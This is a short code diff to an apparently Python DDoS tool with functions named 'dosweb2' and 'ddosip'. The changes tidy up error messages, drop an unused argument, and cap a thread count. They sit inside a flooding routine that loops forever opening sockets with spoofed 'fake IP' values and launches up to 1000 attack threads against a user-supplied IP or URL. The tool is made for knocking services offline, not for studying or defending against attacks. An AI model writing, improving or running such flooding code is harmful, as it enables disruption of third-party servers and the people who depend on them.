@@ -62,7 +62,7 @@ def dosweb2(target):
             print(colorama.Fore.RED + "[-] Connection error!")
 
 
-def ddosip(num):
+def ddosip():
     while True:
         fake_ip = random.choice(fakeip_list)
         r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -89,10 +89,13 @@ if vibor == 1:
     try:
         threads = int(input("Threads[max 1000]: "))
     except ValueError:
-        exit("Threads count is incorrect!")
+        exit(colorama.Fore.RED + "Threads count is incorrect!")
+
+    if threads > 1000 or threads == 0:
+        exit(colorama.Fore.RED + "Incorrect value")
 
     for i in range(0, threads):
-        ipddos = threading.Thread(target=ddosip, args=(1,))
+        ipddos = threading.Thread(target=ddosip)
         ipddos.start()
         print(colorama.Fore.GREEN + str(i + 1) + " thread started!")
 else:
@@ -101,10 +104,10 @@ else:
     try:
         threads = int(input("Threads: "))
     except ValueError:
-        exit("Threads count is incorrect!")
+        exit(colorama.Fore.RED + "Threads count is incorrect!")
 
     if threads == 0:
-        exit("Threads count is incorrect!")
+        exit(colorama.Fore.RED + "Threads count is incorrect!")
 
     if not url.__contains__("http"):
         exit("URL doesnt contains http or https!")
